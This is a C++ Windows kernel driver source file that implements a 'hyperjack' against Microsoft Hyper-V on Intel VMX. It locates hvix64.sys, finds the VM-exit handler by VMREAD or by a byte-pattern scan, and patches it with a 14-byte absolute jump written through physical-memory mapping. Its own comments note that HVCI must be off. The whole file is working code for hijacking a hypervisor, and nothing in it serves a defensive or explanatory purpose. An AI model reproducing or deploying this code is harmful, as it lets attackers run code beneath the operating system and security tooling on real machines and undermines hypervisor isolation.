// hv_hook.cpp  --  Hyper-V exit-handler parasite (hyperjack) for Intel VMX
//
// Strategy (no UEFI required, HVCI must be OFF):
//
//   1. Confirm Hyper-V is running (CPUID 0x40000000 signature check).
//   2. Locate hvix64.sys in the loaded-module list.
//   3. Find its VM-exit handler VA:
//        a. Try VMPTRST + VMREAD HOST_RIP (works on some builds).
//        b. Fallback: scan hvix64 text for VMRESUME (0F 01 C3), walk
//           backwards for ENDBR64 (F3 0F 1E FA) marking the function entry.
//   4. Write a 14-byte absolute JMP at the exit handler VA (via physical-
//      memory mapping -- works when HVCI is off because Hyper-V's pages are
//      not SLAT write-protected against the guest).
//   5. Build a trampoline buffer (executable non-paged pool):
//        [14 saved original bytes] + [absolute JMP back to entry+14]
//   6. On every VM-exit, VmxHyperjackEntry (ASM) fires first, saves host GPRs,
//      calls VmxHyperjackDispatch(), restores, then JMPs to the trampoline so
//      hvix64 handles the exit normally (STIMER, VMRESUME, etc.).

#include "hv_hook.h"
#include "../common/memory.h"
#include "../vmx/vmcs_defs.h"
#include <intrin.h>

// ─────────────────────────────────────────────────────────────────────────────
// ZwQuerySystemInformation is not prototyped in ntddk.h for WDM drivers.
// Declare it manually using ULONG for the class parameter to avoid pulling in
// ntifs.h (which conflicts with ntddk.h in some WDK versions).
// ─────────────────────────────────────────────────────────────────────────────
extern "C" NTSYSAPI NTSTATUS NTAPI ZwQuerySystemInformation(
    ULONG  SystemInformationClass,
    PVOID  SystemInformation,
    ULONG  SystemInformationLength,
    PULONG ReturnLength
);

// ─────────────────────────────────────────────────────────────────────────────
// Module-level state
// ─────────────────────────────────────────────────────────────────────────────

bool HvHook::Active = false;

// Defined in hv_hook_asm.asm (.DATA), read by the ASM stubs to find the trampoline.
extern "C" void* g_VmxTrampolineTarget = nullptr;
extern "C" void* g_SvmTrampolineTarget = nullptr;   // AMD stub, unused on Intel

// ASM entry point (hv_hook_asm.asm) — must be extern "C" at file scope;
// linkage specs are illegal inside function bodies.
extern "C" void VmxHyperjackEntry();

// Trampoline buffer: 14 original bytes + 14-byte absolute JMP back.
static void*  s_TrampolineBuffer  = nullptr;
static UINT64 s_HookedVa          = 0;      // VA we patched (to restore on shutdown)
static UINT64 s_HookedPa          = 0;      // PA of first byte (page-aligned via offset)
static UINT8  s_OriginalBytes[14] = {};
static bool   s_HookInstalled     = false;

// ─────────────────────────────────────────────────────────────────────────────
// ZwQuerySystemInformation helpers
// ─────────────────────────────────────────────────────────────────────────────
typedef struct _RTL_PROCESS_MODULE_INFORMATION {
    HANDLE  Section;
    PVOID   MappedBase;
    PVOID   ImageBase;
    ULONG   ImageSize;
    ULONG   Flags;
    USHORT  LoadOrderIndex;
    USHORT  InitOrderIndex;
    USHORT  LoadCount;
    USHORT  OffsetToFileName;
    UCHAR   FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES;

// ─────────────────────────────────────────────────────────────────────────────
bool HvHook::IsHyperVPresent()
{
    // Bit 31 of CPUID(1).ECX = "Hypervisor present" flag.
    int r[4];
    __cpuid(r, 1);
    if (!(r[2] & (1 << 31))) return false;

    // Confirm it is specifically Microsoft Hyper-V via the vendor string.
    // CPUID(0x40000000): EBX|ECX|EDX = "Microsoft Hv" (little-endian).
    __cpuid(r, 0x40000000);
    return (r[1] == 0x7263694D &&   // "rciM"
            r[2] == 0x666F736F &&   // "foso"
            r[3] == 0x76482074);    // "vH t"
}

// ─────────────────────────────────────────────────────────────────────────────
// Locate a loaded kernel module by filename (e.g. "hvix64.sys").
// ─────────────────────────────────────────────────────────────────────────────
static NTSTATUS FindKernelModule(const char* Name, UINT64* OutBase, UINT32* OutSize)
{
    ULONG needed = 0;
    ZwQuerySystemInformation(11UL, nullptr, 0, &needed);
    if (!needed) return STATUS_NOT_FOUND;
    needed += 0x2000;

    auto* buf = static_cast<RTL_PROCESS_MODULES*>(
        ExAllocatePool2(POOL_FLAG_NON_PAGED, needed, 'kMvH'));
    if (!buf) return STATUS_INSUFFICIENT_RESOURCES;

    NTSTATUS st = ZwQuerySystemInformation(11UL, buf, needed, &needed);
    if (!NT_SUCCESS(st)) { ExFreePoolWithTag(buf, 'kMvH'); return st; }

    for (ULONG i = 0; i < buf->NumberOfModules; ++i) {
        const char* path = reinterpret_cast<const char*>(buf->Modules[i].FullPathName);
        const char* file = path + buf->Modules[i].OffsetToFileName;
        if (_stricmp(file, Name) == 0) {
            *OutBase = reinterpret_cast<UINT64>(buf->Modules[i].ImageBase);
            *OutSize = buf->Modules[i].ImageSize;
            ExFreePoolWithTag(buf, 'kMvH');
            return STATUS_SUCCESS;
        }
    }

    ExFreePoolWithTag(buf, 'kMvH');
    return STATUS_NOT_FOUND;
}

// ─────────────────────────────────────────────────────────────────────────────
// Method A: VMPTRST + VMREAD HOST_RIP.
//
// In guest mode (VMX non-root), these instructions cause a VM-exit to hvix64.
// Some builds of hvix64 emulate VMPTRST and return the real VMCS PA; others
// set ZF=1 (failure).  We try both and bail gracefully if neither works.
// ─────────────────────────────────────────────────────────────────────────────
static UINT64 TryVmptrst(UINT64 hvBase, UINT32 hvSize)
{
    // __vmx_vmptrst returns void in some WDK versions (the intrinsic writes
    // the VMCS PA to the pointed-to location regardless of VMX root state;
    // on failure it leaves the value unchanged, so we pre-fill with a sentinel).
    UINT64 vmcsPhys = ~0ull;
    __vmx_vmptrst(&vmcsPhys);

    if (vmcsPhys == 0 || vmcsPhys == ~0ull || (vmcsPhys & 0xFFF)) {
        HV_LOG("[HJ] VMPTRST returned unusable PA (0x%llX) — falling back to scan",
               vmcsPhys);
        return 0;
    }
    HV_LOG("[HJ] VMCS PA via VMPTRST: 0x%llX", vmcsPhys);

    // VMREAD HOST_RIP. __vmx_vmread also returns void in this WDK build;
    // just check the output value falls inside hvix64's mapped range.
    UINT64 hostRip = 0;
    __vmx_vmread(VMCS_HOST_RIP, &hostRip);

    if (hostRip < hvBase || hostRip >= (UINT64)hvBase + hvSize) {
        HV_LOG("[HJ] VMREAD HOST_RIP out of range (0x%llX) — falling back to scan",
               hostRip);
        return 0;
    }

    HV_LOG("[HJ] hvix64 exit handler via VMREAD: 0x%llX", hostRip);
    return hostRip;
}

// ─────────────────────────────────────────────────────────────────────────────
// Method B: Byte-pattern scan inside hvix64.sys.
//
// Algorithm:
//   1. Scan for VMRESUME opcode (0F 01 C3) in the module text.
//   2. Walk backwards from each occurrence up to 4 KB.
//   3. First, look for ENDBR64 (F3 0F 1E FA) — placed by CET at indirect-call
//      targets; the VM-exit handler is an indirect target (loaded via HOST_RIP).
//   4. Fallback: look for a canonical x64 function prologue at a 16-byte-
//      aligned address (push r15 / push r14 / push r13 sequence).
// ─────────────────────────────────────────────────────────────────────────────
static UINT64 ScanHvix64ForExitHandler(UINT64 hvBase, UINT32 hvSize)
{
    const UINT8* base = reinterpret_cast<const UINT8*>(hvBase);

    for (UINT32 i = 0; i + 3 < hvSize; ++i) {
        // Look for VMRESUME: 0F 01 C3
        if (base[i] != 0x0F || base[i+1] != 0x01 || base[i+2] != 0xC3)
            continue;

        HV_LOG("[HJ] VMRESUME at hvix64+0x%X, scanning backwards...", i);

        // Walk backwards up to 4 KB looking for function entry markers.
        const UINT32 scanBytes = (i < 0x1000) ? i : 0x1000u;

        // Pass 1: ENDBR64 (F3 0F 1E FA) — most reliable on Win11 CET builds.
        for (UINT32 j = i; j >= 4 && (i - j) < scanBytes; --j) {
            if (base[j-4] == 0xF3 && base[j-3] == 0x0F &&
                base[j-2] == 0x1E && base[j-1] == 0xFA) {
                const UINT64 va = hvBase + (j - 4);
                HV_LOG("[HJ] ENDBR64 prologue at hvix64+0x%X → VA 0x%llX", j-4, va);
                return va;
            }
        }

        // Pass 2: 16-byte-aligned address with push r15 (41 57) prologue.
        for (UINT32 j = i; j >= 2 && (i - j) < scanBytes; --j) {
            if ((j & 0xF) == 0 &&
                base[j] == 0x41 && base[j+1] == 0x57) {   // push r15
                const UINT64 va = hvBase + j;
                HV_LOG("[HJ] push-r15 prologue at hvix64+0x%X → VA 0x%llX", j, va);
                return va;
            }
        }

        // Pass 3: 16-byte-aligned address starting with push rbx (53) or
        //         push rbp (55) — older hvix64 builds.
        for (UINT32 j = i; j >= 1 && (i - j) < scanBytes; --j) {
            if ((j & 0xF) == 0 &&
                (base[j] == 0x53 || base[j] == 0x55)) {
                const UINT64 va = hvBase + j;
                HV_LOG("[HJ] push prologue at hvix64+0x%X → VA 0x%llX", j, va);
                return va;
            }
        }

        // Only check the first VMRESUME; it's almost always in the right function.
        break;
    }

    HV_LOG("[HJ] Pattern scan found no exit handler in hvix64");
    return 0;
}

// ─────────────────────────────────────────────────────────────────────────────
// Find hvix64's VM-exit handler VA.  Tries VMPTRST first, then scan.
// ─────────────────────────────────────────────────────────────────────────────
static UINT64 FindVmxExitHandler(UINT64 hvBase, UINT32 hvSize)
{
    UINT64 va = TryVmptrst(hvBase, hvSize);
    if (!va) va = ScanHvix64ForExitHandler(hvBase, hvSize);
    return va;
}

// ─────────────────────────────────────────────────────────────────────────────
// Install a 14-byte absolute-JMP hook at targetVa → hookEntryVa.
//
//   14-byte JMP:   FF 25 00 00 00 00 [8-byte absolute address]
//
// The hook is written by mapping the TARGET'S PHYSICAL PAGE via MmMapIoSpace.
// This bypasses any software write-protection while still hitting the real
// backing page (works when HVCI is off and hvix64 pages are not SLAT-guarded).
// ─────────────────────────────────────────────────────────────────────────────
static NTSTATUS InstallHook(UINT64 targetVa, UINT64 hookEntryVa)
{
    // Save the 14 original bytes at the target.
    RtlCopyMemory(s_OriginalBytes, reinterpret_cast<void*>(targetVa), 14);

    // ── Build the trampoline buffer (executable non-paged pool) ─────────────
    //   [0..13]:  original bytes
    //   [14..19]: FF 25 00 00 00 00     (JMP [RIP+0])
    //   [20..27]: targetVa + 14         (resume address)
    //
    s_TrampolineBuffer = ExAllocatePool2(
        POOL_FLAG_NON_PAGED_EXECUTE, 64, 'pTvH');
    if (!s_TrampolineBuffer) return STATUS_INSUFFICIENT_RESOURCES;

    UINT8* t = static_cast<UINT8*>(s_TrampolineBuffer);
    RtlCopyMemory(t, s_OriginalBytes, 14);      // saved original bytes
    t[14] = 0xFF; t[15] = 0x25;                 // JMP [RIP+0]
    t[16] = 0x00; t[17] = 0x00;
    t[18] = 0x00; t[19] = 0x00;
    *reinterpret_cast<UINT64*>(t + 20) = targetVa + 14; // resume after our hook

    g_VmxTrampolineTarget = s_TrampolineBuffer; // ASM stub reads this

    // ── Write the 14-byte JMP via physical memory ────────────────────────────
    PHYSICAL_ADDRESS pa = MmGetPhysicalAddress(reinterpret_cast<void*>(targetVa));
    if (!pa.QuadPart) {
        HV_LOG("[HJ] MmGetPhysicalAddress failed for VA 0x%llX", targetVa);
        ExFreePoolWithTag(s_TrampolineBuffer, 'pTvH');
        s_TrampolineBuffer = nullptr;
        return STATUS_NOT_FOUND;
    }

    // Map 2 pages in case the 14 bytes straddle a page boundary.
    PHYSICAL_ADDRESS pageBase;
    pageBase.QuadPart = pa.QuadPart & ~(PAGE_SIZE - 1LL);
    const UINT64 offset = pa.QuadPart & (PAGE_SIZE - 1);

    UINT8* mapped = static_cast<UINT8*>(
        MmMapIoSpace(pageBase, PAGE_SIZE * 2, MmNonCached));
    if (!mapped) {
        HV_LOG("[HJ] MmMapIoSpace failed for PA 0x%llX", pageBase.QuadPart);
        ExFreePoolWithTag(s_TrampolineBuffer, 'pTvH');
        s_TrampolineBuffer = nullptr;
        return STATUS_ACCESS_VIOLATION;
    }

    // Build the 14-byte JMP patch.
    UINT8 jmp14[14] = {
        0xFF, 0x25, 0x00, 0x00, 0x00, 0x00,   // JMP [RIP+0]
        0, 0, 0, 0, 0, 0, 0, 0                  // absolute address below
    };
    *reinterpret_cast<UINT64*>(jmp14 + 6) = hookEntryVa;

    RtlCopyMemory(mapped + offset, jmp14, 14);
    MmUnmapIoSpace(mapped, PAGE_SIZE * 2);

    s_HookedVa = targetVa;
    s_HookedPa = pa.QuadPart;
    s_HookInstalled = true;

    HV_LOG("[HJ] Hook: VA 0x%llX → PA 0x%llX → entry 0x%llX trampoline 0x%p",
           targetVa, pa.QuadPart, hookEntryVa, s_TrampolineBuffer);
    return STATUS_SUCCESS;
}

// ─────────────────────────────────────────────────────────────────────────────
// Remove the hook (restore original 14 bytes).
// ─────────────────────────────────────────────────────────────────────────────
static void RemoveHook()
{
    if (!s_HookInstalled) return;

    PHYSICAL_ADDRESS pageBase;
    pageBase.QuadPart = (LONGLONG)(s_HookedPa & ~(PAGE_SIZE - 1));
    const UINT64 offset = s_HookedPa & (PAGE_SIZE - 1);

    UINT8* mapped = static_cast<UINT8*>(
        MmMapIoSpace(pageBase, PAGE_SIZE * 2, MmNonCached));
    if (mapped) {
        RtlCopyMemory(mapped + offset, s_OriginalBytes, 14);
        MmUnmapIoSpace(mapped, PAGE_SIZE * 2);
    }

    s_HookInstalled = false;
    HV_LOG("[HJ] Original bytes restored at 0x%llX", s_HookedVa);
}

// ─────────────────────────────────────────────────────────────────────────────
// HvHook::Initialize
// ─────────────────────────────────────────────────────────────────────────────
NTSTATUS HvHook::Initialize()
{
    if (!IsHyperVPresent()) {
        HV_LOG("[HJ] Hyper-V not present — standalone mode");
        return STATUS_NOT_SUPPORTED;
    }
    HV_LOG("[HJ] Hyper-V detected — attempting hyperjack...");

    // ── Intel only for now (AMD stub: return NOT_SUPPORTED) ─────────────────
    if (g_Hv.Vendor != CpuVendor::Intel) {
        HV_LOG("[HJ] AMD hyperjack not implemented — standalone mode");
        return STATUS_NOT_SUPPORTED;
    }

    // ── 1. Find hvix64.sys ────────────────────────────────────────────────────
    UINT64 hvBase = 0;
    UINT32 hvSize = 0;
    NTSTATUS st = FindKernelModule("hvix64.sys", &hvBase, &hvSize);
    if (!NT_SUCCESS(st)) {
        HV_LOG("[HJ] hvix64.sys not found (0x%X) — standalone mode", st);
        return st;
    }
    HV_LOG("[HJ] hvix64.sys base=0x%llX size=0x%X", hvBase, hvSize);

    // ── 2. Find the VM-exit handler ────────────────────────────────────────────
    const UINT64 exitHandlerVa = FindVmxExitHandler(hvBase, hvSize);
    if (!exitHandlerVa) {
        HV_LOG("[HJ] Cannot locate exit handler — standalone mode");
        return STATUS_NOT_FOUND;
    }

    // ── 3. Hook it ─────────────────────────────────────────────────────────────
    //  VmxHyperjackEntry is forward-declared extern "C" at file scope above.
    const UINT64 entryVa = reinterpret_cast<UINT64>(VmxHyperjackEntry);

    st = InstallHook(exitHandlerVa, entryVa);
    if (!NT_SUCCESS(st)) {
        HV_LOG("[HJ] Hook install failed 0x%X — standalone mode", st);
        return st;
    }

    Active = true;
    HV_LOG("[HJ] Hyperjack ACTIVE — every hvix64 VM-exit now routes through us");
    return STATUS_SUCCESS;
}

// ─────────────────────────────────────────────────────────────────────────────
// HvHook::Shutdown
// ─────────────────────────────────────────────────────────────────────────────
void HvHook::Shutdown()
{
    if (!Active) return;
    RemoveHook();
    if (s_TrampolineBuffer) {
        ExFreePoolWithTag(s_TrampolineBuffer, 'pTvH');
        s_TrampolineBuffer = nullptr;
    }
    g_VmxTrampolineTarget = nullptr;
    Active = false;
    HV_LOG("[HJ] Hyperjack shut down");
}
